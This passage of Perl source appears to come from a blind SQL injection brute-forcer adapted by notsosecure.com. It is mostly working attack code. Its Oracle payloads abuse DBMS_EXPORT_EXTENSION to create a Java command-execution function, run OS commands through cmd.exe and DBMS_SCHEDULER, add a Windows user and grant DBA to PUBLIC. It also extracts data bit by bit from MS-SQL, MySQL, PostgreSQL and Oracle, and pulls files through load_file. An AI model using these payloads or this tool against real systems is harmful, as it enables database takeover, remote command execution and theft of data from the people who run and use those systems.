my $javaperm="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";

my $cmd_exec_func="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''''''LinxUtil.runCMD(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual) is null--";

my $cmd_exec_func_priv="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";
my $cmd_exec_func_unpriv="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' drop function LinxRunCMD '''';END;'';END;--','SYS',0,'1',0) from dual)is null--";
  
my $cmd_1=$cmd;
my $cmd_exec="(select sys.LinxRunCMD('cmd.exe /c". $cmd_1. "') from dual) is null--";

print "Step 1. Creating Java Library...\n";
#print "--------------------------------\n";
my $url=$url_1.$javalib;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 1 occured !!!...did you provide me the URL in the format, i want?? \n";
	print "-----------------------------------------------\n";
  } else {
    print "NO errors encountered.....proceeding to step..2\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 2. granting java execute privileges...\n";
my $url=$url_1.$javaperm;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 2 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "I will proceed, however, there is a possibility that the attack will fail\n";
  } else {
    print "NO errors encountered.....proceeding to step..3\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 3. creating funtion for command execution...\n";
my $url=$url_1.$cmd_exec_func;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
	print "ERROR at STAGE 3 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "I will proceed, however, there is a possibility that the attack will fail\n";
  } else {
    print "NO errors encountered.....proceeding to step..4\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 4. making function executable by all users...\n";
my $url=$url_1.$cmd_exec_func_priv;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 4 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "I will proceed, however, there is a possibility that the attack will fail\n";
  } else {
    print "NO errors encountered.....proceeding to step..5\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 5. RIGHT!!!, by now we should have a function sys.LinxRunCMD through which we can execute commands...\n";
print "--------------------------------\n";
print "You should be able to execute this function as:\nselect sys.LinxRunCMD('cmd.exe /c net user notsosecure n0ts3cur3 /add') from dual\n";
print "I will execute the command you told me to execute... you won't be able to see the output though :( \n";
my $url=$url_1.$cmd_exec;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 5 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "...You need to investigate buddy....\n";
  } else {
	print "-----------------------------------------------\n";
	print "SUCCESS: Your command executed on the box....:)\n";
	print "-----------------------------------------------\n";

  }	
#-----------------------
print "Step 6. Droping function sys.LinxRunCMD...\n";
my $url=$url_1.$cmd_exec_func_unpriv;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;

  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 6 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "!!!!WARNING:I have not been able to drop the function..!!!!!!\n";
	exit 0;
  } else {
	print "Function dropped..\n";
	exit 0;
}
  	}
  # this completes stype=0
		

###############################---stype 0--- stops here##########################

###############################---stype 1--- starts here##########################


		if ($stype==1) {
			print "Command execution in oracle 9 with plsql_native_make_utility.. not yet ready..:(\n";
		exit 0;
		}



###############################---stype 1--- stops here##########################

###############################-stype 2--starts here--##############################
		if ($stype==2) {
			print "O.S command execution with dbms_scheduler\n";
			print "\n\n!!NOTE:!!! Supply commands with full paths such as:\n";
			print "c:\\WINDOWS\\system32\\cmd.exe /c c:\\whoami.exe >> c:\\bsql.txt\n\n\n";
			if ($cmd eq "ping 127.0.0.1") {
			 $cmd = "C:\\windows\\system32\\cmd.exe /c C:\\windows\\system32\\whoami.exe >> C:\\notsosecure.txt";
			 print "Executing default cmd: ".$cmd. "\n";
			}
			#------ora_cmd_v10.pl startes here------


my $cmd_1=$cmd;
my $url_1 = $url." and ";
my $step1="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' begin DBMS_SCHEDULER.create_program(''''''''bsql5'''''''',''''''''EXECUTABLE'''''''',''''''''".$cmd_1."'''''''',0,TRUE); end;'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";

my $step2="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin DBMS_SCHEDULER.create_job(job_name => ''''''''bsql5job'''''''',program_name => ''''''''bsql5'''''''',start_date => NULL,repeat_interval => NULL,end_date => NULL,enabled => TRUE,auto_drop => TRUE); end;'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";

my $step3="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' begin DBMS_SCHEDULER.drop_program(PROGRAM_NAME => ''''''''bsql5''''''''); end; '''';END;'';END;--','SYS',0,'1',0) from dual) is null--";

#my $cmd_exec_func_priv="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD 
#to public'''';END;'';END;--','SYS',0,'1',0) from dual)--";
  

#my $cmd_exec="(select sys.LinxRunCMD('cmd.exe /c". $cmd_1. "') from dual)--";

print "Step 1...Creating job........\n";
print "--------------------------------\n";
my $url=$url_1.$step1;
#print $method;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 1 occured !!!...did you provide me the URL in the format, i want?? \n";
	print "-----------------------------------------------\n";
  } else {
    print "\nNO errors encountered.....proceeding to step..2\n";
	print "--------------------------------\n";
	
 #print $content; 
}

#-----------------------
print "Step 2.....Executing Job......\n";
print "I will execute the command you told me to execute... you won't be able to see the output though :( \n";
my $url=$url_1.$step2;
#print $url."\n";
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 2 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "I will proceed, however, there is a possibility that the attack will fail\n";
#	print $content;
  } else {
    print "NO errors encountered.....proceeding to step..3\n";
	print "--------------------------------\n";
	#print $content; 
}

#-----------------------


print "\nStep 3. Removing Job...\n";
print "----------sleeping for 15 secs-----------------------------\n";
sleep(15);
my $url=$url_1.$step3;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/$match/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at Step 3 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "...You need to investigate buddy....\n";
	print $content;
	
  } else {
	print "-----------------------------------------------\n";
	print "SUCCESS: Your command executed on the box....:)\n";
	print "-----------------------------------------------\n";
	
# print $content; 
}


			#------ora_cmd_v10.pl stops here------
				
				
				
				
				
				
				
				
				
				
				exit 0;}	
				
###############---stype 2---stops here-------##########################

		}

######################---type 4 stops here##############################
		
		
	
						
				
########################--type 3 starts here---###########################
if($type==3)
	{
		print "--------------------------------\n";
		print "Oracle Privilege escalation\n\n";
		print "Supported versions less <=:\n(Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2, XE)\n\n";
		print "--------------------------------\n";
		print "\n\n!!!Note:!!! Please provide the vulnerable parameter as the last parameter\n";
		print "I will \"GRANT DBA TO PUBLIC\" and Later REVOKE it back\n\n";
		print "--------------------------------\n";
		print "String to match: ".$match."\n";


my $grantdbatopub=" and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual) is null --";

#my $grantpriv=" and 1=(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on linx_query to public'''';END;'';END;--','SYS',0,'1',0) from dual)--";
my $url_1=$url.$grantdbatopub;
print "\n...sending request..\n";
print "\n";


my $content;
$content = get_or_post($method,$url_1,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;
my $match_1 eq "Warning";

if (!$match) {
	print "you did not supply any match string, i will look for Warning keyword..\n"; 
	print "tying to match:".$match_1."\n";}

  if(! ($content =~ m/$match/i)) {
        print "-----------------------------------------------\n";
    die "ERROR occured !!!...did you provide me the URL in the format, i want?? \n";
        print "-----------------------------------------------\n";
		die "cannot proceed";	
  } else {
	          print "--------------------------------\n";
			  print "No Errors Encountered...We are DBA now....\n";
              print "--------------------------------\n";
  
  }


	}

#################### Type 3 stops here#################################
 
( ! $get) ? sqlget() : fileget();

my @byte = ();
my $wait_me;

sub getbyte {
   my $sql = $_[0];
   my $bit="";
   my @thread_count = ();
   my $c = 8;
   my $i = 0;
   $high = 128 unless $ascii;#) ? 128 : { 64; $byte[0] = 0; };
   $wait_me = 0; 

   share($wait_me);
   share (@byte);

   if ($ascii) {
     $byte[0] = 0; 
     $high = 64;
   }
   for ($bit=1;$bit<=$high;$bit*=2) {
# launch thread ->
	$thread_count[$i] = threads->create(\&launch_thread ,$sql, $bit, $c);
	$thread_count[$i]->detach;
	$c--;
   }

   while ($wait_me <= 7) {
	usleep(50);
	#sleep(1);# if !$dontsleep;
   }

   my $str = join("",@byte);
   #print "\nSTR: $str\n";
   return pack("B*","$str");

}

sub launch_thread {
	my ($sql, $bit, $c) = @_;
	my $val;	
	my $and="%26";
	 if (lc($method) eq "post"){
	 $and="&";
	 }
	 ###------------MS-SQL BLOCK STARTS HERE---------------------###

if ($database==0) {


#print "I am here";
		if ($url =~ /'$/) {
      ##   $val = "$head and (ASCII($sql) $and $bit)=0-- $tail";
 if ($type==1) 
					  { 
						 $val = "$head and (select case when((ASCII($sql) $and $bit) =0) then 1 else 1/0 end )=1-- $tail";
					  }
			  else {	if($type==0)
					  {	   
			  $val = "$head and (ASCII($sql) $and $bit)=0-- $tail";
					  } 

					  else {	if($type==2)
					  {	   
						 $val = "$head,(select case when((ASCII($sql) $and $bit) =0) then 1 else 1/0 end )=1-- $tail";
					  } 
				   }  

	}}
		  		  else{
					   if ($type==1) 
					  { 
						 $val = "$head and (select case when ((ASCII($sql) $and $bit) =0)then 1 else 1/0 end)=1 $tail";
					  }
			  else {	if($type==0)
					  {	   
			  $val = "$head and (ASCII($sql) $and $bit)=0 $tail";
					  }
					  
					   else {	if($type==2)
					  {	   
						 $val = "$head,(select case when((ASCII($sql) $and $bit) =0) then 1 else 1/0 end )=1 $tail";
					  } 
				   }  
				   }  
			   
				  } 


				}


	 ###------------MS-SQL BLOCK STOPS HERE---------------------###
	 ###----------POSTGRES BLOCK STARTS HERE---------------------###

if ($database==2) {



		if ($url =~ /'$/) {
    
 if ($type==1) 
	
					  { 
						 $val = "$head and (case when ((ASCII($sql) $and $bit) =0) then 1 else (1 * (select 1 from information_schema.tables)) end)=1-- $tail";
					  }
			  else {	if($type==0)
					  {	   
			  $val = "$head and (ASCII($sql) $and $bit)=0-- $tail";
					  } 
				   
				   else {	if($type==2)
					  {	   
						 $val = "$head,(case when ((ASCII($sql) $and $bit) =0) then 1 else (1 * (select 1 from information_schema.tables)) end)-- $tail";
					  } 
				   }  
				   }  



	}
		  		  else{
					   if ($type==1) 
					  { 
						 $val = "$head (case when ((ASCII($sql) $and $bit) =0) then 1 else (1 * (select 1 from information_schema.tables)) end) $tail";
					  }
			  else {	if($type==0)
					  {	   
			  $val = "$head and (ASCII($sql) $and $bit)=0 $tail";
					  } 
 else {	if($type==2)
					  {	   
						 $val = "$head,(case when ((ASCII($sql) $and $bit) =0) then 1 else (1 * (select 1 from information_schema.tables)) end) $tail";
					  } 


				   }  

				   }  
			   
				  } 


				}
###----------POSTGRES BLOCK STOPS HERE---------------------###
###----------ORACLE BLOCK STARTS---------------------------####
	 if ($database==3) {
	 
if ($url =~ /'$/) 
{
          if ($type==1) 
	
					  { 
						 $val = "$head and (select case when BITAND((ASCII($sql)), $bit)=0 then  (select 1 from dual) else 1/0  end from dual)=1-- $tail";
					  }
			  else {	if($type==0)
					  {	   
						 $val = "$head and BITAND((ASCII($sql)), $bit)=0-- $tail";					
						} 
else {	
	if($type==2)
					  {	   
						 $val = "$head,(select case when BITAND((ASCII($sql)), $bit)=0 then  (select 1 from dual) else 1/0  end from dual)-- $tail";
					  } 
	  }

				   }  

}
		  		  
				  else{



					   if ($type==1) 
					  { 
						 $val = "$head and (select case when BITAND((ASCII($sql)), $bit)=0 then  (select 1 from dual) else 1/0  end from dual)=1 $tail";
					  }


			  	if($type==0)
					  {	   
			   $val = "$head and BITAND((ASCII($sql)), $bit)=0 $tail";
					  }
					  
			
					if($type==2)
					   {	   
						 $val = "$head,(select case when BITAND((ASCII($sql)), $bit)=0 then  (select 1 from dual) else 1/0  end from dual) $tail";
					    } 
				
				   
				   
				     
			   if($type==3)
				  {
				 $val = "$head and 1=(select case when BITAND((ASCII($sql)), $bit)=0 then  (select 1 from dual) else 1/0  end from dual)-- $tail";

				  }

		}






				  }


###----------ORACLE BLOCK STOPS HERE---------------------------####
###------------MY-SQL BLOCK STARTS HERE---------------------###
#print $database;
	
	if ($database==1) {
	
	
	if ($url =~ /'$/)		{
          if ($type==1) 
					  { 
						 $val = "$head and (select case when (ord($sql) $and $bit=0 ) then 1 else 1*(select table_name from information_schema.tables)end)='1 $tail";
					  }

			  else {	if($type==0)
					  {	   
			  $val = "$head and (ord($sql) $and $bit)='0 $tail";
					  } 
				  
# or one may also use #
						
						else {	if($type==2)
					  {	   
						 $val = "$head,(select case when (ord($sql) $and $bit=0 ) then 1 else 1*(select table_name from information_schema.tables)end)%23 $tail";
					  } 
				   }    } 
							
							
					}
		  	
				  
				  
				  
				  
				  
				  
				  
				  else
					 
				{
					  if ($type==1) 
					  { 
						 $val = "$head  and (select case when (ord($sql) $and $bit=0 ) then 1 else 1*(select table_name from information_schema.tables)end)=1 $tail";
					  }
			  else {if($type==0)
					  {	   
			  $val = "$head and (ord($sql) $and $bit)=0 $tail";
					  } 
					 
				 

				 	else {	if($type==2)
					  {	   
						 $val = "$head,(select case when (ord($sql) $and $bit=0 ) then 1 else 1*(select table_name from information_schema.tables)end) $tail";
					  } 
				   }}  
						

				}
###-----------MySQL BLOCK ENDS HERE-------------------###




 }
				  #print "VAL[$c] $val\n";
        if (lc($method) eq "post") {
                $vars{$lastvar} = $lastval . $val;

        }
        $furl = $url;
        $furl =~ s/($lastvar=$lastval)/$1$val/;
        &createlwp if $rproxy || $ruagent;
        my $html=fetch("$furl");
        $hits++;
        foreach (split(/\n/,$html)) {
		lock @byte;
		
		if ($nomatch)
		{ #print "NO match Supplied";
		#print $nomatch;
                if (/\Q$nomatch\E/) {
                    $byte[$c]=1;
                    last;
                 } else { $byte[$c] = 0; }
				 }
				 
				 else {
				 #print "match supplied";
				  if (/\Q$match\E/) {
                    $byte[$c]=0;
                    last;
                 } else { $byte[$c] = 1; }
				 }
				 
				 
				 }
	lock $wait_me;
	threads->yield();
	$wait_me++;
}

sub sqlget									{


	##--ms-sqlblock--##




if ($database==0 ) {

my ($fsize,$i,$s);
        $s = "SUBSTRING(cast( len(len ( ($sql) ) )as varchar(100)),1,1)";
	my $lng .= getbyte($s);
	for ($i=1;$i<=$lng;$i++) {
		$s = "SUBSTRING(cast(len(($sql))as varchar(100)),$i,1)";
		$fsize.=getbyte($s);
	}

	#print "FSIZE: $fsize\n";
	$length = $fsize. "bytes";
	&bsqlintro();

	my $rsize = $start + 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		$s = "substring(cast(($sql)as varchar($fsize)),$i,1)";
		#print "S: $s\n";
		my $byte = getbyte($s);
		$solution .= $byte;
		print $byte;
 	}


}

	##--ms-sql block-finish--##
	##---oracle block starts--##
if ($database==3)
	

{



	
	my ($fsize,$i,$s);
        $s = "SUBSTR(cast(length(length(($sql)))as varchar2(100)),1,1)";
	my $lng .= getbyte($s);
	for ($i=1;$i<=$lng;$i++) {
		$s = "SUBSTR(cast(length(($sql))as varchar2(100)),$i,1)";
		$fsize.=getbyte($s);
	}

	#print "Output Length: $fsize\n";
	$length = $fsize. "bytes";
	&bsqlintro();

	my $rsize = $start + 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		$s = "substr(cast(($sql)as varchar2($fsize)),$i,1)";
		#print "S: $s\n";
		my $byte = getbyte($s);
		$solution .= $byte;
		print $byte;
 	}
}


	##---oracle block finish--##
##--postgres block----##
if ($database==2) {
my ($fsize,$i,$s);
	
        $s = "SUBSTR(cast(length(length(($sql)))as varchar),1,1)";
	my $lng .= getbyte($s);
	for ($i=1;$i<=$lng;$i++) {
		$s = "SUBSTR(cast(length(($sql))as varchar),$i,1)";
		$fsize.=getbyte($s);
	}

	print "FSIZE: $fsize\n";
	$length = $fsize. "bytes";
	&bsqlintro();

	my $rsize = $start + 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		
		$s = "substr(cast(($sql)as varchar($fsize)),$i,1)";
		#print "S: $s\n";
		my $byte = getbyte($s);
		$solution .= $byte;
		print $byte;
 	}


}

	##--postgres block-finish--##
	##-mysql block--##
	if ($database==1) {
		my ($fsize,$i,$s);
        $s = "mid(length(length(($sql))),1,1)";
	my $lng .= getbyte($s);
	for ($i=1;$i<=$lng;$i++) {
		$s = "mid(length(($sql)),$i,1)";
		$fsize.=getbyte($s);
	}
	
	#print "FSIZE: $fsize\n";
	$length = $fsize. "bytes";
	&bsqlintro();

	my $rsize = $start + 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		$s = "mid(($sql),$i,1)";
		#print "S: $s\n";
		my $byte = getbyte($s);
		$solution .= $byte;
		print $byte;
 	}
}

##-mysql-block-##
										}

#---------------end-------------------#
sub fileget {
	my ($lget,$fstr);
	if ($get =~ m/.*\/(.*)/) {
		$lget = $1; }
		$fstr = "0x".unpack("H*","$get");
	if ($get =~ m/.*\\(.*)/) {
		$lget = $1;
		$fstr = "\"$get\"";
	}

	my $rsize = $start + 1;
	if (-e "$lget" && ! $start) { 
		$rsize = -s "$lget";
		print "Error: file ./$lget exists.\n"; 
		print "You can erase or resume it with: -start $rsize\n";
		exit 1
	}
	my ($i,$fsize);
	$sql = "mid(length(length(load_file($fstr))),1,1)";
	my $lng .= getbyte($sql);
	for ($i=1;$i<=$lng;$i++) {
		my $find = 0;
		$sql = "mid(length(load_file($fstr)),$i,1)";
		$fsize.=getbyte($sql);
	}

	if ($fsize < "1") { print "Error: file not found, no permissions or ... who knows\n"; exit 1 }
	$length = $fsize. "bytes";
	# starting ..
	$sql = "load_file($get)";

	&bsqlintro();
	# Get file
	#print "---> $lget";
	open FILE, ">>$lget";
	FILE->autoflush(1);
	print "\n--- BEGIN ---\n";
	my ($i,$b,$fcontent);
	$rsize = 1 if $rsize < 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		my $find = 0;
		my ($furl, $b_start, $b_end, $z);
		$sql = "mid(load_file($fstr),$i,1)";
		$fcontent=getbyte($sql);
		print $fcontent;
		print FILE "$fcontent";
 	}
	print "\n--- END ---\n";
        close FILE;
	$solution = "success";
	$sql = "$get";
}



&result();



#########################################################################
sub httpintro {
	my ($strcookie, $strproxy, $struagent, $strtime, $i);
	print "--[ http options ]"; print "-"x62; print "\n";
	printf ("%12s %-8s %11s %-20s\n","schema:",$scheme,"host:",$authority);
	if ($ruagent) { $struagent="rnd.file:$ruagent" } else { $struagent = $uagent }
	printf ("%12s %-8s %11s %-20s\n","method:",uc($method),"useragent:",$struagent);
	printf ("%12s %-50s\n","path:", $path);
	foreach (keys %vars) {
		$i++;
		printf ("%12s %-15s = %-40s\n","arg[$i]:",$_,$vars{$_});
	}
	if (! $cookie) { $strcookie="(null)" } else { $strcookie = $cookie; }
	printf ("%12s %-50s\n","cookies:",$strcookie);
	if (! $proxy && !$rproxy) { $strproxy="(null)" } else { $strproxy = $proxy; }
	if ($rproxy) { $strproxy = "rnd.file:$rproxy" }
	printf ("%12s %-50s\n","proxy_host:",$strproxy);
	if (! $proxy_user) { $strproxy="(null)" } else { $strproxy = $proxy_user; }
 	# timing
	if (! $time && !$rtime) { $strtime="0sec (default)" } 
	if ( $time == 0) { $strtime="0 sec (default)" } 
	if ( $time == 1) { $strtime="15 secs" } 
	if ( $time == 2) { $strtime="5 mins" } 
	if ($rtime) { $strtime = "rnd.time:$rtime" }
	printf ("%12s %-50s\n","time:",$strtime);
	printf("\n\nFinding Length of SQL Query....\n");
}

sub bsqlintro {
	my ($strstart, $strblind, $strlen, $strmatch, $strsql);
	print "\n--[ blind sql injection options ]"; print "-"x47; print "\n";
	if (! $start) { $strstart = "(null)"; } else { $strstart = $start; }
	if (! $blind) { $strblind = "(last) $lastvar"; } else { $strblind = $blind; }
	printf ("%12s %-15s %11s %-20s\n","blind:",$strblind,"start:",$strstart);
	printf ("%12s %-15s %11s %-20s\n","database:",$database,"type:",$type);
	if ($length eq $default_length) { $strlen = "$length (default)" } else { $strlen = $length; }
	if ($sql eq $default_sql) { $strsql = "$sql (default)"; } else { $strsql = $sql; }
	printf ("%12s %-15s %11s %-20s\n","length:",$strlen,"sql:",$strsql);
	if ($amatch eq 1) { $strmatch = "auto match:(!!THIS MAY BE WRONG!!)" } else { $strmatch = "match:"; }
	#printf ("%12s %-60s\n","$strmatch",$match);
	print " $strmatch $match\n";
	print "-"x80; print "\n\n";
	printf "\n Getting Data...\n";
}

#########################################################################

sub createlwp {
	my $proxyc;
	&getproxy;
	&getuagent if $ruagent;
	LWP::Debug::level('+') if $debug gt 3;
	$ua = new LWP::UserAgent(
        cookie_jar=> { file => "$$.cookie" }); 
	$ua->agent("$uagent");
	if (defined($proxy_user) && defined($proxy_pass)) {
		my ($pscheme, $pauthority, $ppath, $pquery, $pfragment) =
		$proxy =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		$proxyc = $pscheme."://".$proxy_user.":".$proxy_pass."@".$pauthority;
	} else { $proxyc = $proxy; }
	
	$ua->proxy(['http'] => $proxyc) if $proxy;
	undef $proxy if $rproxy;
	undef $uagent if $ruagent;
}	

sub cookie {
	# Cookies check
	if ($cookie || $cookie =~ /; /) {
		foreach my $c (split /;/, $cookie) {
			my ($a,$b) = split /=/, $c;
			if ( ! $a || ! $b ) { die "Wrong cookie value. Use -h for help\n"; }
		}
	}
}

sub parseurl {
 ###############################################################################
 # Official Regexp to parse URI. Thank you somebody.
	($scheme, $authority, $path, $query, $fragment) =
		$url =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
	# Parse args of URI into %vars and @varsb.
	foreach my $varval (split /&/, $query) {
		my ($var, $val) = split /=/, $varval;
		$vars{$var} = $val;
		push(@varsb, $var);
	}
}


#########################################################################
# Show options at running:
sub banner {
		print "\n // Blind SQL injection brute forcer \\\\ \n //originally written by...aramosf\@514.es  \\\\ \n";
	print " \n // mofified by sid-at-notsosecure.com \\\\ \n // http://www.notsosecure.com \\\\ \n";
}


#########################################################################
# Get differences in HTML
sub fmatch {
 my ($ok,$rtrn);
 my ($furla, $furlb,$quote) = ($_[0], $_[0],$_[1]);
 my ($html_a, $html_b);
 if (lc($method) eq "get") {
	$furla =~ s/($lastvar=$lastval)/$1 ${quote}1/;
	$furlb =~ s/($lastvar=$lastval)/$1 ${quote}0/;
 	$html_a = fetch("$furla");
	$html_b = fetch("$furlb");
 } elsif (lc($method) eq "post") {
   $vars{$lastvar} = $lastval . " ${quote}1";
   $html_a = fetch("$furla");
   $vars{$lastvar} = $lastval . " ${quote}0";
   $html_b = fetch("$furla");
   $vars{$lastvar} = $lastval;
 }


 #print "$html_a";
 #print "$html_b";

 if ($html_a eq $html_b) {
  $rtrn = "no vulnerable";
  return $rtrn;
 }


 my @h_a = split(/\n/,$html_a);
 my @h_b = split(/\n/,$html_b);
 foreach my $a (@h_a) {
	$ok = 0;
	if ($a =~ /\w/) {
   		foreach (@h_b) {
		    if ($a eq $_) {$ok = 1; }
		}
	} else { $ok = 1; }
   $rtrn = $a;
   last if $ok ne 1;
 }
 return $rtrn;
}


#########################################################################
# Fetch HTML from WWW
sub fetch {
	#print "fetch: $_[0]\n";
	my $secs;
	if ($time == 0) { $secs = 0 }
	elsif ($time == 1) { $secs = 15 }
	elsif ($time == 2) { $secs = 300 }
	if ($rtime =~ /\d*-\d*/ && $time == 0) {
		my ($l,$p) = $rtime =~ m/(\d+-\d+)/;
		srand; $secs = int(rand($p-$l+1))+$l;
	} elsif ($rtime =~ /\d*-\d*/ && $time != 0) {
		print "You can't run with -time and -rtime. See -help.\n";
		exit 1;
	}
	sleep $secs;
	
	my $res;
	if (lc($method) eq "get") {
		my $fetch = $_[0];
		if ($cookie) {
			$res = $ua->get("$fetch", Cookie => "$cookie");
		} elsif (!$cookie) {
			$res = $ua->get("$fetch");
		}
	} elsif (lc($method) eq "post") {
		my($s, $a, $p, $q, $f) =
  	    $url=~m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		my $fetch = "$s://$a".$p;
		if ($cookie) {
	    	$res = $ua->post("$fetch",\%vars, Cookie => "$cookie");
		} elsif (!$cookie) {
		    $res = $ua->post("$fetch",\%vars);
		}
	} else {
		die "Wrong httpd method. Use -h for help\n";
	}
	my $html = $res->content();
	return $html;
}


sub getproxy {
	if ($rproxy && $proxy !~ /http/) {
		my @lproxy;
		open PROXY, $rproxy or die "Can't open file: $rproxy\n";
		while(<PROXY>) { push(@lproxy,$_) if ! /^#/ }
		close PROXY;
		srand; my $ind = rand @lproxy;
		$proxy = $lproxy[$ind];
	} elsif ($rproxy && $proxy =~ /http/)  {
		print "You can't run with -proxy and -rproxy. See -help.\n";
		exit 1;
	}
}

sub getuagent {
		my @uproxy;
		open UAGENT, $ruagent or die "Can't open file: $ruagent\n";
		while(<UAGENT>) { push(@uproxy,$_) if ! /^#/ }
		close UAGENT;
		srand; my $ind = rand @uproxy;
		$uagent = $uproxy[$ind];
		chop($uagent);
}

sub result {
	print "\r results:\n" ." $sql = $solution\n" if length($solution) > 0; 


if ($end==1)
	
{ 
	##### dropping function linxreadfile()
print "\ndropping function sys.LinxReadFile()\n";
